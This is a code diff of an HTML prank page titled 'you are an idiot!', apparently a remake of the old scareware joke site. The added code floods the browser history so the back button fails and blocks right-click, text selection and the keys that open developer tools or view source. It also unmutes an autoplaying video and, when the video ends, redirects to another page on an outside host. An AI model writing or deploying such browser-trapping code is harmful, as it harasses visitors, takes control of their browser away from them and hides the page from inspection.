@@ -1,9 +1,7 @@
 <!DOCYTPE html>
-<html lang="ja">
+<html lang="en">
     <head>
         <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-        <meta name="viewport" content="width=device-width,initial-scale=1.0">
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">
         <title>you are an idiot!</title>
         <style>
         #main {
@@ -20,36 +18,43 @@
             transform: translate(-50%, -50%);
         }
         </style>
-        <script async>
-        for (var i = 0; i <= 16; i+=4) {
-            history.pushState(null, null, null);
-            history.pushState(null, null, null);
-        }
-        window.addEventListener('popstate', (event) => {
-            if (!event.originalEvent.state) {
+        <script>
+            document.oncontextmenu = function () {return false;}
+            for (var i = 0; i < 16; i+=2) {
                 history.pushState(null, null, null);
-                return;
+                history.pushState(null, null, null);
             }
-        });
-        
-        window.document.onkeydown = function(event){
-            if(event.keyCode >= 112 && event.keyCode <= 123) {
-                event.keyCode = null;
-                event.returnValue = false;
-                window.alert('あんたホントに馬鹿ですね。');
-            }
-        };
+            window.addEventListener('popstate', (event) => {
+                if (!event.originalEvent.state) {
+                    history.pushState(null, null, null);
+                    return;
+                }
+            });
         </script>
     </head>
-    <body onContextmenu="window.alert('あんたホントに馬鹿ですね。');return false">
-        <script>
-        var music = new Audio("youare.mp3");
-        music.play();
-        </script>
-        <video src="youare.mp4" type="video/mp4" id="main" autoplay muted onended="location.href='https://ware255.github.io/open.html';">
+    <body onMouseDown="return false;" onSelectStart="return false" onContextmenu="return false">
+        <video id="main" autoplay muted onended="location.href='https://ware255.github.io/open.html';" src="youare.mp4" type="video/mp4">
         </video>
         <script>
-        music.stop();
+        toggleMute();
+        function toggleMute() {
+            var video = document.getElementById("main")
+            if(video.muted){
+                video.muted = false;
+            }
+            else {
+                video.muted = true;
+            }
+        }
+        window.document.onkeydown = function(evt) {
+            if ((evt.which == 73 && evt.ctrlKey == true && evt.shiftKey == true)
+            || (evt.which == 123) || (evt.which == 85 && evt.ctrlKey == true)
+            || (evt.which == 18) || (evt.which == 83 && evt.ctrlKey == true)
+            ) {
+                evt.which = null;
+                return false;
+            }
+        }
         </script>
     </body>
 </html>
